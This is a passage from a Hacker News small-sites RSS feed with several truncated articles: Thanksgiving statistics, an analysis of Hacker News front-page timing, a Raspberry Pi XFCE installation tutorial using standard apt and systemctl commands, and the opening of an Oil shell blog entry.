<ul><li><strong>$1.19</strong> per pound is the cheapest one, sold at Sam’s Club in 2020 and Aldi in 2019. </li><li><strong>$3.49 </strong>is the most expensive one in 2020, sold at Trader Joe’s and Whole Food’s; <strong> $4.49 </strong>per pound<strong> </strong>was the most expensive one in 2019, sold at Wegmans. </li></ul>
<h3>What is the lifespan of wild turkey?</h3>
<p><strong>3 to 4 years</strong>, according to National Geographic. </p>
<h3>How many eggs wild turkey hatches?</h3>
<p><strong>4 to 17 eggs</strong>, according to National Geographic. That’s quantity for one year period. It means in a lifetime it hatches <strong>12 to 68 eggs</strong>. </p>
<h3>What is the flying speed that wild turkey can reach?</h3>
<p><strong>55</strong> miles per hour according to National geographic, or <strong>88.5</strong> kilometer per hour. This however is valid for short flying intervals/distances. The farmed turkey as opposed to the wild one, does not have such ability. </p>
<h2 id="anchor-2">Travel Thanksgiving statistics</h2>
<div><figure><img src="https://i0.wp.com/bagsaway.com/blog/wp-content/uploads/2020/11/travel.gif?w=910&amp;ssl=1" alt="GIF: Guy running with luggage " title="Thanksgiving Statistics, 80+ intriguing stats 4 | BagsAway" data-recalc-dims="1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP/yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><figcaption>Getting ready for travel.<br>Source: Giphy</figcaption></figure></div>
<h3>How many Americans are planning to travel for Thanksgiving this year?</h3>
<p><strong>43% </strong>of people plan to travel on Thanksgiving, based on a survey by the American Hotel and Lodging Association, (TravelUpdate). Another recent survey by <a href="http://ir.tripadvisor.com/news-releases/news-release-details/tripadvisor-reveals-2020-thanksgiving-travel-index-over-half-56" target="_blank" rel="noopener">TripAdvisor</a> indicates that <strong>56%</strong> of Americans will travel for Thanksgiving this year, which is down from a 70% level in 2019. Obviously the cause is the pandemic. </p>
<p>According to data from AAA, the forecast for 2020 is that there will be 50 million travelers in the United States, down from 55.3 million travelers in 2019. This breaks for the first time the positive holiday travel trend that started in 2008. </p>
<div><figure><img src="https://i0.wp.com/bagsaway.com/blog/wp-content/uploads/2020/11/Number-of-travelers-for-Thanksgiving-holiday-in-the-USA-between-2002-and-2020.png?w=910&amp;ssl=1" alt="Chart: Amount of travelers for Thanksgiving holiday in the USA between 2002 and 2020 year" srcset="https://i0.wp.com/bagsaway.com/blog/wp-content/uploads/2020/11/Number-of-travelers-for-Thanksgiving-holiday-in-the-USA-between-2002-and-2020.png?w=740&amp;ssl=1 740w, https://i0.wp.com/bagsaway.com/blog/wp-content/uploads/2020/11/Number-of-travelers-for-Thanksgiving-holiday-in-the-USA-between-2002-and-2020.png?resize=300%2C219&amp;ssl=1 300w, https://i0.wp.com/bagsaway.com/blog/wp-content/uploads/2020/11/Number-of-travelers-for-Thanksgiving-holiday-in-the-USA-between-2002-and-2020.png?resize=320%2C234&amp;ssl=1 320w, https://i0.wp.com/bagsaway.com/blog/wp-content/uploads/2020/11/Number-of-travelers-for-Thanksgiving-holiday-in-the-USA-between-2002-and-2020.png?resize=640%2C467&amp;ssl=1 640w, https://i0.wp.com/bagsaway.com/blog/wp-content/uploads/2020/11/Number-of-travelers-for-Thanksgiving-holiday-in-the-USA-between-2002-and-2020.png?resize=360%2C263&amp;ssl=1 360w, https://i0.wp.com/bagsaway.com/blog/wp-content/uploads/2020/11/Number-of-travelers-for-Thanksgiving-holiday-in-the-USA-between-2002-and-2020.png?resize=720%2C525&amp;ssl=1 720w" sizes="(max-width: 740px) 100vw, 740px" title="Thanksgiving Statistics, 80+ intriguing stats 5 | BagsAway" data-recalc-dims="1" data-lazy-srcset="https://i0.wp.com/bagsaway.com/blog/wp-content/uploads/2020/11/Number-of-travelers-for-Thanksgiving-holiday-in-the-USA-between-2002-and-2020.png?w=740&amp;ssl=1 740w, https://i0.wp.com/bagsaway.com/blog/wp-content/uploads/2020/11/Number-of-travelers-for-Thanksgiving-holiday-in-the-USA-between-2002-and-2020.png?resize=300%2C219&amp;ssl=1 300w, https://i0.wp.com/bagsaway.com/blog/wp-content/uploads/2020/11/Number-of-travelers-for-Thanksgiving-holiday-in-the-USA-between-2002-and-2020.png?resize=320%2C234&amp;ssl=1 320w, https://i0.wp.com/bagsaway.com/blog/wp-content/uploads/2020/11/Number-of-travelers-for-Thanksgiving-holiday-in-the-USA-between-2002-and-2020.png?resize=640%2C467&amp;ssl=1 640w, https://i0.wp.com/bagsaway.com/blog/wp-content/uploads/2020/11/Number-of-travelers-for-Thanksgiving-holiday-in-the-USA-between-2002-and-2020.png?resize=360%2C263&amp;ssl=1 360w, https://i0.wp.com/bagsaway.com/blog/wp-content/uploads/2020/11/Number-of-travelers-for-Thanksgiving-holiday-in-the-USA-between-2002-and-2020.png?resize=720%2C525&amp;ssl=1 720w" data-lazy-src="https://i0.wp.com/bagsaway.com/blog/wp-content/uploads/2020/11/Number-of-travelers-for-Thanksgiving-holiday-in-the-USA-between-2002-and-2020.png?w=910&amp;is-pending-load=1#038;ssl=1" data-old-srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP/yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><figcaption>Amount of travelers for Thanksgiving holiday in the USA between 2002 and 2020 year</figcaption></figure></div>
<h3>How are they going to travel?</h3>
<p><strong>76% </strong>by car/driving, <strong>11%</strong> by taking a flight. (TripAdvisor)</p>
<h3>When do travelers make bookings?</h3>
<p><strong>61%</strong> of Thanksgiving travelers in 2019 booked their trips within six weeks before the holiday. This tendency is expected to repeat again in 2020 because of the lingering uncertainties in the travel sector (<a href="https://www.travelpulse.com/news/impacting-travel/early-thanksgiving-2020-travel-trends-emerge-from-latest-data.html" target="_blank" rel="noopener">TravelPulse</a>). </p>
<p>This year United Airlines expects 50% of its customers to book their Thanksgiving flights less than 30 days before their planned departure. That’s a 10 percentage points increase from last year when 40% of its customers booked their flight 30 days before departure. (United Airlines) </p>
<h3>What are the most booked destinations in 2020?</h3>
<p><strong>Top 10 Thanksgiving booked destinations</strong> until October 2020 on Skyscanner are (based on TravelPulse): </p>
<ol><li>New York, </li><li>Cancun; </li><li>Orlando; </li><li>Las Vegas; </li><li>Denver; </li><li>Los Angeles; </li><li>Fort Lauderdale; </li><li>Atlanta; </li><li>Chicago; </li><li>Tampa;</li></ol>
<h3>When do people plan to depart for Thanksgiving this year?</h3>
<p><strong>Wednesday, November 25</strong> is the departure date of the majority of bookings in 2020 according to Priceline. (<a href="https://www.travelandleisure.com/holiday-travel/busiest-holiday-travel-days-christmas-thanksgiving-2020" target="_blank" rel="noopener">TravelandLeasure</a>)</p>
<h3>When do people plan to return home from Thanksgiving this year?</h3>
<p><strong>Sunday, November 29</strong> is the date when most or <strong>36%</strong> of the bookings are scheduled with a return trip, according to Priceline. The rest will return on days before or after November 29. (TravelandLeasure)</p>
<h3>What is the impact of covid-19 pandemic on Thanksgiving bookings this year?</h3>
<p><strong>-16%</strong> less bookings until September this year compared to 2019, according to Guesty, with a note that the number may decrease or improve because of last minute bookings. (<a href="https://www.cnbc.com/2020/09/14/holiday-travel-bookings-lag-but-trend-in-last-minute-trips-might-help.html" target="_blank" rel="noopener">CNBC</a>)</p>
<p>Based on Guestyâ€™s findings lack of bookings may hit Christmas and New Yearâ€™s Eve harder because until September the bookings lag with -35% and â€“ 33% for each holiday respectively. (CNBC)</p>
<h3>How do people plan to celebrate Thanksgiving this year?</h3>
<ul><li><strong>52% </strong>of people will celebrate the holiday this year with their closest family,</li><li><strong>14% </strong>won’t celebrate it at all, and</li><li><strong>10%</strong> will travel somewhere for the holiday, according to Ipsos poll in the U.S. (<a href="https://www.ipsos.com/en-us/news-polls/thanksgiving-plans-COVID19" target="_blank" rel="noopener">Ipsos</a>)</li></ul>
<div><figure><img src="https://i2.wp.com/bagsaway.com/blog/wp-content/uploads/2020/11/Rplot-1.jpg?w=910&amp;ssl=1" alt="Chart: Thanksgiving statistics about
Thanksgiving plans for 2020 - How people in United States plan to spend the holiday." srcset="https://i2.wp.com/bagsaway.com/blog/wp-content/uploads/2020/11/Rplot-1.jpg?w=732&amp;ssl=1 732w, https://i2.wp.com/bagsaway.com/blog/wp-content/uploads/2020/11/Rplot-1.jpg?resize=300%2C141&amp;ssl=1 300w, https://i2.wp.com/bagsaway.com/blog/wp-content/uploads/2020/11/Rplot-1.jpg?resize=320%2C151&amp;ssl=1 320w, https://i2.wp.com/bagsaway.com/blog/wp-content/uploads/2020/11/Rplot-1.jpg?resize=640%2C302&amp;ssl=1 640w, https://i2.wp.com/bagsaway.com/blog/wp-content/uploads/2020/11/Rplot-1.jpg?resize=360%2C170&amp;ssl=1 360w, https://i2.wp.com/bagsaway.com/blog/wp-content/uploads/2020/11/Rplot-1.jpg?resize=720%2C339&amp;ssl=1 720w" sizes="(max-width: 732px) 100vw, 732px" title="Thanksgiving Statistics, 80+ intriguing stats 6 | BagsAway" data-recalc-dims="1" data-lazy-srcset="https://i2.wp.com/bagsaway.com/blog/wp-content/uploads/2020/11/Rplot-1.jpg?w=732&amp;ssl=1 732w, https://i2.wp.com/bagsaway.com/blog/wp-content/uploads/2020/11/Rplot-1.jpg?resize=300%2C141&amp;ssl=1 300w, https://i2.wp.com/bagsaway.com/blog/wp-content/uploads/2020/11/Rplot-1.jpg?resize=320%2C151&amp;ssl=1 320w, https://i2.wp.com/bagsaway.com/blog/wp-content/uploads/2020/11/Rplot-1.jpg?resize=640%2C302&amp;ssl=1 640w, https://i2.wp.com/bagsaway.com/blog/wp-content/uploads/2020/11/Rplot-1.jpg?resize=360%2C170&amp;ssl=1 360w, https://i2.wp.com/bagsaway.com/blog/wp-content/uploads/2020/11/Rplot-1.jpg?resize=720%2C339&amp;ssl=1 720w" data-lazy-src="https://i2.wp.com/bagsaway.com/blog/wp-content/uploads/2020/11/Rplot-1.jpg?w=910&amp;is-pending-load=1#038;ssl=1" data-old-srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP/yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><figcaption>Thanksgiving holiday plans for 2020</figcaption></figure></div>
<h2 id="anchor-3">Food and cooking</h2>
<h3>How much turkey do you need for your Thanksgiving feast?</h3>
<p><strong>1 pound</strong> per person, according to USDA. </p>
<h3>How many families gather each Thanksgiving for a dinner?</h3>
<p><strong>96%</strong> of American families gather for a feast (<a href="https://blog.nationwide.com/thanksgiving-fun-facts-infographic/" target="_blank" rel="noopener">Nationwide</a>). Based on the survey results shown above, this figure probably applies in normal times, not this year. </p>
<h3>What is the average number of dinner guests per household on Thanksgiving?</h3>
<p><strong>11</strong>&nbsp;is the average number of dinner guests per household (<a href="https://www.ft.com/content/ad5ac488-046a-11ea-a958-5e9b7282cbd1" target="_blank" rel="noopener">FinancialTimes</a>), and 28% of Americans had more than 12 people at their table in 2019, according to Nationwide. </p>
<h3>How much time is spent on cooking the Thanksgiving meal?</h3>
<p><strong>7 hours</strong> is the average time, according to Nationwide. </p>
<h3>How much time is spent on eating the Thanksgiving meal?</h3>
<p><strong>16 minutes</strong>, according to Nationwide. Obviously people spend a lot more time in preparation for the Thanksgiving dinner than for the eating occasion. </p>
<h3>What kind of pies are eaten after dinner?</h3>
<ul><li><strong>57%</strong> are pumpkin pies; </li><li><strong>14%</strong> pecan; </li><li><strong>9%</strong> sweet potato;</li><li><strong>20%</strong> other type of pies, according to Nationwide. </li></ul>
<h3>How many …</h3></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://bagsaway.com/blog/thanksgiving-statistics/">https://bagsaway.com/blog/thanksgiving-statistics/</a></em></p>]]>
            </description>
            <link>https://bagsaway.com/blog/thanksgiving-statistics/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25191707</guid>
            <pubDate>Mon, 23 Nov 2020 20:53:58 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Getting lucky with posting on Hacker News]]>
            </title>
            <description>
<![CDATA[
Score 8 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25191157">thread link</a>) | @reconquestio
<br/>
November 23, 2020 | https://samizdat.dev/getting-lucky-with-posting-on-hacker-news/ | <a href="https://web.archive.org/web/*/https://samizdat.dev/getting-lucky-with-posting-on-hacker-news/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="content">
<article>
    <p>You know the feeling of watching your post quickly drowning in the Newest section of Hacker News, right?
It seems like pure, chaotic luck. Or is it?</p>
<p>I tried to crack the code of successful submissions.</p>
<p>I built a tool that parses Hacker News every two minutes and logs the state into the
database. The program has been working for <strong>14 days</strong> so far.</p>
<p>For the latest two weeks, there were <strong>13846</strong> stories, and only <strong>1403</strong> of them reached the first
page of Hacker News.</p>
<p>It’s <strong>10.1329</strong> percents. It doesn’t sound too bad, does it? It turns out <strong>every tenth story
hits the first page</strong>.</p>
<p><em>All time values are in UTC.</em></p>
<h2 id="stories-and-chances-to-hit-the-first-page">Stories and chances to hit the first page</h2>

<p>It seems like Saturday and Sunday are the least active days when it comes to new stories.
But it means you have the biggest chance to hit the first page during these days.</p>
<h2 id="total-number-of-stories-and-chances-by-hour">Total number of stories and chances by hour</h2>
<p>Let’s take a look what about best hours to publish then.</p>

<ul>
<li>I wouldn’t post at 15:00 - 16:00 since it’s the lowest chance to hit the first page. Too many
submissions during these hours.</li>
<li>11:00 - 12:00 looks like a good spot, everyone is getting awake and your post is already waiting
them on the first page.</li>
</ul>
<h2 id="votes-and-overall-activity">Votes and overall activity</h2>
<p>The watcher continuously checks Hacker News and logs the current position and the score of every
story into the database.</p>
<p>Let’s see what the most active days and hours were.</p>

<ul>
<li>Saturday and Sunday are the least active days.</li>
<li>Monday is the most active day.</li>
</ul>

<ul>
<li>00:00 - 10:00 are the least active hours</li>
<li>14:00 - 21:00 (UTC) are the most active hours on Hacker News.</li>
<li>15:00 - 19:00 (UTC) are the best hours.</li>
</ul>
<h2 id="finally-fun-facts">Finally, fun facts</h2>
<ul>
<li>48 stories hit the first page with literally 1 score point (you get it by default).</li>
<li>4 stories hit the first page with literally 2 score points.</li>
<li>590 stories needed 3 score points to appear on the first page.</li>
<li>318 stories needed 4 points.</li>
<li>143 stories needed 5 points.</li>
</ul>
<p>The longest living posts on the first page:</p>
<ul>
<li>65h13m56s  <a href="https://news.ycombinator.com/item?id=25154128">Flash Animations Live Forever at the Internet Archive </a></li>
<li>63h34m18s  <a href="https://news.ycombinator.com/item?id=25074959">macOS unable to open any non-Apple application</a></li>
<li>49h17m45s  <a href="https://news.ycombinator.com/item?id=25044254">Zoom lied to users about end-to-end encryption for years, FTC says</a></li>
<li>45h29m29s  <a href="https://news.ycombinator.com/item?id=25031491">Japan’s Onryō Spirits Inhabit a Purgatory of Revenge and Cosmic Rage </a></li>
<li>45h26m48s  <a href="https://news.ycombinator.com/item?id=25042002">Large-scale multilingual audio visual dubbing </a></li>
</ul>
<p>I’m going to analyze the statistics even further, it’s just a matter of time.</p>
<p><strong>Follow me on Twitter to get updates: <a href="https://twitter.com/reconquestio">@reconquestio</a></strong></p>
<p>Have an idea or want to contribute? Tweet/Email me.</p>
<h2 id="missing-charts">Missing charts</h2>
<ul>
<li>
<p>The watcher records the position of stories on the page and this data is not illustrated on the charts.</p>
</li>
<li>
<p>There is enough data to come up with a specific interval of time required to get the first upvotes to
get to the first page.</p>
<p>For instance, 3 upvotes in 12 hours will not get you to the first page, but will 3 upvotes
in 5 minutes get you there?</p>
</li>
<li>
<p>How long do posts live on the first page on average?</p>
</li>
</ul>
<h2 id="other-researches">Other researches</h2>
<ul>
<li><a href="https://antontarasenko.com/2015/04/23/best-time-to-post-its-irrelevant/">2015, Best Time to Post? It’s Irrelevant</a></li>
<li><a href="https://www.reddit.com/r/Entrepreneur/comments/5451l4/findings_on_the_optimal_time_to_post_to_hacker/">2016, /r/Enterpreneur: Findings on the optimal time to post to Hacker News</a></li>
<li><a href="https://medium.com/@mi.schaefer/what-is-the-best-time-to-post-to-hacker-news-829fad3eac71">2017, What is the best time to post to Hacker News?</a></li>
<li><a href="https://chanind.github.io/2019/05/07/best-time-to-submit-to-hacker-news.html">2019, The Best Time to Submit to Hacker News</a></li>
</ul>
<p>Thanks to <a href="https://twitter.com/ivmirx">Ivan Mir</a> for reading drafts of this.</p>


<hr>
    <b>Comments</b>
    
    
</article>

        </div></div>]]>
            </description>
            <link>https://samizdat.dev/getting-lucky-with-posting-on-hacker-news/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25191157</guid>
            <pubDate>Mon, 23 Nov 2020 20:10:33 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Install the XFCE desktop on your Raspberry Pi]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25191105">thread link</a>) | @URfejk
<br/>
November 23, 2020 | https://www.pragmaticlinux.com/2020/11/install-the-xfce-desktop-on-your-raspberry-pi/ | <a href="https://web.archive.org/web/*/https://www.pragmaticlinux.com/2020/11/install-the-xfce-desktop-on-your-raspberry-pi/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<p>In this article you’ll learn how to install the XFCE desktop on your Raspberry PI. We’ll take a minimal install of the Raspberry PI operating system as a starting point. The XFCE installation on your Raspberry PI includes setting up all necessary building blocks, such as: display server, display manager, session manager, window manager and desktop environment.</p>
<h2>Background</h2>
<p>When you install the default Raspberry PI operating system, it presents you with the PIXEL desktop. The Raspberry PI foundation developed and maintains the PIXEL desktop. It offers a user-friendly desktop, with all basic features and applications included. For example: an application menu, a file manager, a text editor, etc. PIXEL is lightweight, meaning that it doesn’t consume a lot of RAM and CPU resources. This makes it run smoothly, even on a Raspberry PI Zero with only 512 MB of RAM.</p>
<p>So why would you want to switch to another desktop, such as XFCE? I can think of a few reasons:</p>
<ul><li>As a Linux desktop user, you probably did your fair share of desktop environment hopping. You might have settled on the XFCE desktop. Consequently, you prefer to run the XFCE desktop also on your Raspberry PI.</li><li>Your Raspberry PI serves as a Linux learning platform. You would like to find out what it takes to install a desktop environment from scratch.</li></ul>
<h3>The new Raspberry PI 400</h3>
<p>Over the years the Raspberry PI has gotten ever more powerful. It’s no longer just an embedded Linux board. Especially the Raspberry PI 4 packs enough CPU power and RAM for usage as you daily desktop computer. The Raspberry PI foundation thinks so too. Just look at the <a href="https://www.raspberrypi.org/products/raspberry-pi-400/">Raspberry PI 400</a> model they recently released. They market it as a “complete personal computer, built into a compact keyboard”:</p>
<figure><img loading="lazy" width="900" height="365" src="https://www.pragmaticlinux.com/wp-content/uploads/2020/11/raspi400.png" alt="Image of the Raspberry PI 400. It's a Raspberry PI 4 build into a keyboard. Marketed as a complete personal computer, built into a compact keyboard." srcset="https://www.pragmaticlinux.com/wp-content/uploads/2020/11/raspi400.png 900w, https://www.pragmaticlinux.com/wp-content/uploads/2020/11/raspi400-300x122.png 300w, https://www.pragmaticlinux.com/wp-content/uploads/2020/11/raspi400-768x311.png 768w" sizes="(max-width: 900px) 100vw, 900px"></figure>
<p>You no longer need to restrict yourself to the PIXEL desktop. The Raspberry PI 4 comes a quad-core 64-bit CPU and 2, 4 or 8 GB RAM. More than sufficient to run a ‘real’ Linux desktop such as XFCE, KDE or Gnome.</p>
<h3>Why the XFCE desktop</h3>
<p>So why did I select the XFCE desktop for this article? In my opinion the XFCE desktop sits nicely between the PIXEL desktop and the more resource intensive desktops such as Gnome and KDE. It offers a full desktop experience, while still being lightweight and with snappy responsiveness. The XFCE desktop is stable, well maintained and available in all major Linux distributions. It’s the desktop environment I personally select, when installing a Linux desktop on older hardware or in a virtual machine.</p>
<h2>What do you need</h2>
<p>To complete the steps in this article and install the XFCE desktop on your Raspberry PI, you need the following:</p>
<ul><li>Any Raspberry PI 4 board, including the new Raspberry PI 400.</li><li>A power supply for the Raspberry PI board.</li><li>A micro-SD card of 8 GB or more in size.</li><li>A USB mouse</li><li>A USB keyboard (not needed for the Raspberry PI 400).</li><li>A computer monitor or TV.</li><li>A cable for connecting the HDMI output to your monitor or TV.</li></ul>
<p>Throughout this article, I assume you already installed the Raspberry PI operating system. I recommend the <em>Lite</em> edition. The <em>Lite</em> edition of the Raspberry PI operating system does not include a graphical desktop environment. That way you start with a clean slate.</p>
<p>I’ll be using my Raspberry PI 4 with 4 GB RAM to install the XFCE desktop. I already installed the <em>Lite</em> edition of the Raspberry PI operating system on it. Furthermore, I added a new user account for user <code>pragmalin</code> and removed the default <code>pi</code> user account, for security purposes. Although not necessary, I recommend that you start with the same foundation. Refer to the previously published tutorial on how to <a href="https://www.pragmaticlinux.com/2020/11/perform-a-minimal-install-on-your-raspberry-pi/">perform a minimal install on your Raspberry PI</a> for step-by-step instructions.</p>
<h2>Graphical desktop components</h2>
<p>Before diving right into the installation of XFCE on your Raspberry PI, I would like to present a brief overview of all the components that go into a Linux graphical desktop. This theoretical background information is optional. Feel free to skip to the next section to continue with the hands-on XFCE installation part on your Raspberry PI.</p>
<p>Refer to the following illustration for an overview of all components:</p>
<figure><img loading="lazy" width="410" height="269" src="https://www.pragmaticlinux.com/wp-content/uploads/2020/11/component_layers.png" alt="Illustration showing all the components that go into a graphical desktop on Linux. To install the XFCE desktop on a Raspberry PI we need these components: Xorg, lightdm, xfce4-session, xfwm4 and xfce4." srcset="https://www.pragmaticlinux.com/wp-content/uploads/2020/11/component_layers.png 410w, https://www.pragmaticlinux.com/wp-content/uploads/2020/11/component_layers-300x197.png 300w" sizes="(max-width: 410px) 100vw, 410px"></figure>
<p>Note the added text after the arrow in the illustration. These are the specific components we’ll install for our XFCE desktop. For a Linux graphical desktop, the specific components can differ. For example, a Gnome desktop environment typically uses the <em>gdm</em> display manager instead of <em>lightdm</em>.</p>
<h3>Display server</h3>
<p>In order to do anything graphically, as opposed to just the basic command line, you need a display server. It provides the foundation needed by all the other components. It handles outputting pixels on the display and detecting input events from the mouse and keyboard.</p>
<h3>Display manager</h3>
<p>Think of the display manager as the login screen. It is the first thing that gets started if the operating system supports a graphical desktop. On this screen you enter your username and password to login. Furthermore, it offers you a choice of the desktop session to start.</p>
<h3>Session manager</h3>
<p>After logging in, the display manager hands control over to the session manager. Simply put, the session manager manages the state of the desktop of the logged in user(s). So which applications are running and what their window state and position is. Furthermore, the session manager makes it possible to save your desktop when you logout. Upon the next login it can automatically restore your desktop for you.</p>
<h3>Window manager</h3>
<p>The window manager controls the placement, movement and look of all windows and their controls (button, check box, etc). Its the one that draws the border around each window and adds the title bar. Additionally, the window manager enables you to tile, stack and move windows around.</p>
<h3>Desktop environment</h3>
<p>To have a fully functional graphical desktop you still need a bit more. For example an application menu, a task-bar panel showing running applications and notification icons. And then your basic suite of applications such as a file manager, terminal program, text editor, etc. The desktop environment combines all these parts. Its goal is to provide you with a cohesive and productive graphical user experience.</p>
<h2>Install the XFCE desktop components</h2>
<p>At this point you have a good understanding of what components you need, to install the XFCE desktop on your Raspberry PI. Time to get our hands dirty. We’ll install all the XFCE desktop components in one go on your Raspberry PI. This includes:</p>
<ul><li><em>Xorg</em> display server</li><li><em>lightdm</em> display manager</li><li><em>xfce4-session</em> session manager</li><li><em>xfwm4</em> window manager</li><li><em>xfce4</em> desktop environment</li></ul>
<p>Power up your Raspberry PI and login with your username and password at the console. Next, run the following command to install the XFCE desktop components on your Raspberry PI:</p>
<p><code>sudo apt install -y xserver-xorg xfce4 xfce4-goodies</code></p>
<figure><img loading="lazy" width="769" height="569" src="https://www.pragmaticlinux.com/wp-content/uploads/2020/11/apt_xfce_install.png" alt="Terminal screenshot of installing the XFCE desktop related packages on the Raspberry PI. The following command is used: sudo apt install -y xserver-xorg xfce4 xfce4-goodies." srcset="https://www.pragmaticlinux.com/wp-content/uploads/2020/11/apt_xfce_install.png 769w, https://www.pragmaticlinux.com/wp-content/uploads/2020/11/apt_xfce_install-300x222.png 300w" sizes="(max-width: 769px) 100vw, 769px"></figure>
<p>As you can see in the last line of the screenshot, all XFCE desktop components consume about 1 GB of disk space. With all the XFCE desktop components installed on your Raspberry PI, we continue with setting them up.</p>
<h2>Setup the XFCE desktop components</h2>
<p>In the previous section, we installed all XFCE desktop components on your Raspberry PI. As a next step we make sure the right desktop components are selected. If you started with a minimal install of the Raspberry PI operating system, this will most likely be the case already. However, if you previously installed a different desktop environment, we need to double-check this selection, to make sure it works for an XFCE desktop.</p>
<h3>Select the display server</h3>
<p>You probably only have one display server installed (<em>Xorg</em>), so you do not have to explicitly select one. However, it could be that you didn’t have a display sever installed before. In this case we need to verify that the display server gets started during boot.</p>
<p>Systemd should handle this for us. Without the presence of a display server, Systemd’s default boot target is the multi user shell. Also called <code>multi-user.target</code>. When installing a display server, Systemd’s default boot target should change to a graphical multi user shell. This one is called <code>graphical.target</code>.</p>
<p>To determine Systemd’s default boot target, run this command:</p>
<p><code>sudo systemctl get-default</code></p>
<figure><img loading="lazy" width="713" height="33" src="https://www.pragmaticlinux.com/wp-content/uploads/2020/11/systemd_get_default.png" alt="Terminal screenshot that shows the output of running the &quot;sudo systemctl get-default&quot; command. It should output &quot;&quot;graphical.target&quot;." srcset="https://www.pragmaticlinux.com/wp-content/uploads/2020/11/systemd_get_default.png 713w, https://www.pragmaticlinux.com/wp-content/uploads/2020/11/systemd_get_default-300x14.png 300w, https://www.pragmaticlinux.com/wp-content/uploads/2020/11/systemd_get_default-700x33.png 700w" sizes="(max-width: 713px) 100vw, 713px"></figure>
<p>It should output <code>graphical.target</code>. If it doesn’t, then you can set it manually by running the command:</p>
<p><code>sudo systemctl set-default graphical.target</code>.</p>
<h3>Select the display manager</h3>
<p>The following component to select is the display manager. We want to select <em>lightdm</em> as the display manager. Easily achieved by running the following command:</p>
<p><code>sudo dpkg-reconfigure lightdm</code></p>
<figure><img loading="lazy" width="416" height="23" src="https://www.pragmaticlinux.com/wp-content/uploads/2020/11/select_display_manager.png" alt="Terminal screenshot that shows what command to run for selecting the lightdm display manager." srcset="https://www.pragmaticlinux.com/wp-content/uploads/2020/11/select_display_manager.png 416w, https://www.pragmaticlinux.com/wp-content/uploads/2020/11/select_display_manager-300x17.png 300w" sizes="(max-width: 416px) 100vw, 416px"></figure>
<h3>Select the session manager</h3>
<p>Next we’ll go ahead and select the session manager. Type this command in the terminal:</p>
<p><code>sudo update-alternatives --config x-session-manager</code></p>
<figure><img loading="lazy" width="764" height="153" src="https://www.pragmaticlinux.com/wp-content/uploads/2020/11/select_session_manager.png" alt="Terminal screenshot that shows how to select the session manager, with the help of the update-alternatives command. Make sure to select startxfce4 here and not xfce4-session." srcset="https://www.pragmaticlinux.com/wp-content/uploads/2020/11/select_session_manager.png 764w, https://www.pragmaticlinux.com/wp-content/uploads/2020/11/select_session_manager-300x60.png 300w" sizes="(max-width: 764px) 100vw, 764px"></figure>
<p>On this screen we need to make sure <em>startxfce4</em> is selected as the session manager. Press <kbd>Enter</kbd> if startxfce4 is already selected, otherwise enter the number of the <em>startxfce4</em> session.</p>
<p>A bit odd, right? In an earlier section I mentioned that we want the <em>xfce4-session</em> session manager. The selection menu lists <em>xfce4-session</em>, so why not pick it? The <em>startxfce4</em> file consists of a script that initializes the XFCE session and under the hood calls the <em>xfce4-session</em> executable for us. This makes <em>startxfce4</em> the better option here.</p>
<h3>Select the window manager</h3>
<p>Continue with the selection of the window manager. Run the following command:</p>
<p><code>sudo update-alternatives --config x-window-manager</code></p>
<figure><img loading="lazy" width="805" height="55" src="https://www.pragmaticlinux.com/wp-content/uploads/2020/11/select_window_manager.png" alt="Terminal screenshot that shows the update-alternatives command for selecting the xfwm4 window manager." srcset="https://www.pragmaticlinux.com/wp-content/uploads/2020/11/select_window_manager.png 805w, https://www.pragmaticlinux.com/wp-content/uploads/2020/11/select_window_manager-300x20.png 300w, https://www.pragmaticlinux.com/wp-content/uploads/2020/11/select_window_manager-768x52.png 768w" sizes="(max-width: 805px) 100vw, 805px"></figure>
<p>On my Raspberry PI, <em>xfwm4</em> is the only available window manager. Therefore no additional configuration is needed.</p>
<h3>Select the desktop environment</h3>
<p>You select the desktop environment on the login screen. So now would be the right time to reboot our Raspberry PI and wait for the login screen to show up. On the top right corner of the screen, there is a little icon you can click. Select <em>Xfce Session</em> from the drop-down menu:</p>
<figure><img loading="lazy" width="200" height="96" src="https://www.pragmaticlinux.com/wp-content/uploads/2020/11/select_desktop_environment.png" alt="Screenshot of the lightdm session manager that shows how to select Xfce Session on the login screen."></figure>
<h2>Configure the XFCE desktop</h2>
<p>At this point we completed installing and selecting the right components for the XFCE desktop on our Raspberry PI. In this section we’ll make some final configurations for our XFCE desktop. If you …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.pragmaticlinux.com/2020/11/install-the-xfce-desktop-on-your-raspberry-pi/">https://www.pragmaticlinux.com/2020/11/install-the-xfce-desktop-on-your-raspberry-pi/</a></em></p>]]>
            </description>
            <link>https://www.pragmaticlinux.com/2020/11/install-the-xfce-desktop-on-your-raspberry-pi/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25191105</guid>
            <pubDate>Mon, 23 Nov 2020 20:06:23 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Fixes and Updates to Oil Benchmarks]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25191032">thread link</a>) | @todsacerdoti
<br/>
November 23, 2020 | http://www.oilshell.org/blog/2020/11/fixes-and-updates.html | <a href="https://web.archive.org/web/*/http://www.oilshell.org/blog/2020/11/fixes-and-updates.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page">
  <!-- INSERT LATCH HTML -->
<p><a href="http://www.oilshell.org/blog/">blog</a> | <a href="http://www.oilshell.org/">oilshell.org</a></p>

<p>
  2020-11-23
</p>
